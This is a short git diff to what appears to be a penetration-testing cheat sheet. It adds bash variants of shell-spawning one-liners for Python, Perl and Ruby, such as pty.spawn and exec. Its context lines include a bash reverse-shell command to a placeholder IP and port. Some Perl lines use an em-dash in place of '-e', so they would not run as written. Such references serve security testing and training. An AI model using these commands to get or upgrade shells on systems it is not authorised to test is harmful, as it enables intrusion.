@@ -97,13 +97,14 @@ bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
 ```
 import os; os.system("/bin/sh")
 ```
-
-```
-python -c 'import pty; pty.spawn("/bin/bash")'
-```
-
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
+```
+```
+import os; os.system("/bin/bash")
+```
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ## PHP:
@@ -126,6 +127,12 @@ exec "/bin/sh";
 ```
 perl —e 'exec "/bin/sh";'
 ```
+```
+exec "/bin/bash";
+```
+```
+perl —e 'exec "/bin/bash";'
+```
 
 ## Ruby:
 ```
@@ -133,6 +140,12 @@ exec "/bin/sh"
 ```
 ```
 ruby -e 'exec "/bin/sh"'
+```
+```
+exec "/bin/bash"
+```
+```
+ruby -e 'exec "/bin/bash"'
 ```
 
 ## IRB:
